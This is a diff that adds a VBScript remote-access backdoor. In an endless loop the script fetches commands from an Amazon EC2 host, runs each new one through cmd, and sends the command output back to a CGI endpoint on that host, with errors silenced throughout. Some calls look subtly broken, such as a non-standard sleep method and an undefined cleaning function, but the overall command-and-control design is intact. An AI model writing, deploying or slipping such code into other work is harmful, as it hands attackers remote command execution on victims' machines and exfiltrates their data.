@@ -1,0 +1,38 @@
+On Error Resume Next
+Dim XMLHTTPService
+Dim datafromClipboard 
+dim i
+Dim previousDatafromClipboard
+Dim WshShell
+Set XMLHTTPService = CreateObject("MSXML2.XMLHTTP")
+Set XMLHTTPService1 = CreateObject("MSXML2.XMLHTTP")
+Set WshShell = WScript.CreateObject("WScript.Shell")
+
+
+lastCommand = "none"
+i = 0
+do while true
+i = i +1
+
+WshShell.sleep(5000)
+
+XMLHTTPService.open "GET", "http://ec2-100-26-21-107.compute-1.amazonaws.com/commands.txt?counter=" & i, False
+XMLHTTPService.send
+
+sResponse = XMLHTTPService.ResponseText 
+
+sResponse = Clean(trim(sResponse))
+sResponse = Replace(sResponse, vbLf, "")
+
+if sResponse <> lastCommand Then
+lastCommand = sResponse
+set exe = WshShell.Exec("cmd /c " & sResponse)
+sout = exe.StdOut.ReadAll
+
+XMLHTTPService1.open "GET", "http://ec2-100-26-21-107.compute-1.amazonaws.com/cgi-bin/39a1ea4cf184eaeb09da83749cf40a4239a1ea4cf184eaeb09da83749cf40a42.cgi?output=" & sout, False
+XMLHTTPService1.send
+
+end if
+
+Loop
+Msgbox "VBSCRIPT ABRUPTLY ENDED"
